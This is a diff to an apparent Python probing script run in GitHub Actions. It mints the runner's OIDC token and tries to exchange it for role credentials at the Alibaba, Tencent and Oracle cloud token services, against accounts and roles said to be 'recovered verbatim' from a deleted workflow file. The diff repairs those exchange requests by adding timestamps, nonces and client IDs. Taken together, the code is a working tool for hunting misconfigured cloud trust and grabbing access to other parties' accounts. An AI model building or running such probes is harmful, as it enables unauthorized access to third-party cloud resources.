@@ -3,7 +3,7 @@
 One mint per distinct audience, exactly ONE exchange per target, exact error body recorded.
 Targets recovered verbatim from the deleted c211-i119945-nonbig3.yml (voice-bot 0a3621c).
 AWS role set already tested in i4168 run 45629362934 (all InvalidIdentityToken; openvdb 403)."""
-import json, os, urllib.request, urllib.error, urllib.parse, base64, socket
+import json, os, time, random, urllib.request, urllib.error, urllib.parse, base64, socket
 
 socket.setdefaulttimeout(40)
 base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
@@ -66,7 +66,9 @@ if ja:
             'Action': 'AssumeRoleWithOIDC', 'Version': '2015-04-01',
             'OIDCProviderArn': 'acs:ram::%s:oidc-provider/github-actions' % acct,
             'RoleArn': 'acs:ram::%s:role/%s' % (acct, role),
-            'OIDCToken': ja, 'DurationSeconds': '3600'})
+            'OIDCToken': ja, 'DurationSeconds': '3600',
+            'Timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+            'Format': 'JSON'})
         out['ali::%s::%s' % (acct, role)] = {'http': st, 'body': b}
 
 # --- Tencent: audience sts.tencentcloudapi.com ---
@@ -84,7 +86,8 @@ if jt:
             'Action': 'AssumeRoleWithWebIdentity', 'Version': '2018-08-13',
             'ProviderId': 'github', 'WebIdentityToken': jt,
             'RoleArn': 'qcs::cam::uin/%s:roleName/%s' % (u, rn),
-            'RoleSessionName': 'prl-i4825-t1'},
+            'RoleSessionName': 'prl-i4825-t1',
+            'Timestamp': int(time.time()), 'Nonce': random.randint(100000, 999999)},
             {'Content-Type': 'application/x-www-form-urlencoded',
              'X-TC-Action': 'AssumeRoleWithWebIdentity',
              'X-TC-Version': '2018-08-13', 'X-TC-Region': ''})
@@ -122,7 +125,8 @@ if jo:
                 'requested_token_type': 'urn:oci:token-type:resource-principal-session-token',
                 'subject_token': jo,
                 'subject_token_type': 'urn:ietf:params:oauth:token-type:jwt',
-                'audience': 'https://%s.identity.oraclecloud.com' % dom}
+                'audience': 'https://%s.identity.oraclecloud.com' % dom,
+                'client_id': cid}
         st, b = post('https://%s.identity.oraclecloud.com/oauth2/v1/token' % dom, data)
         out['oci::' + dom] = {'http': st, 'body': b}
 
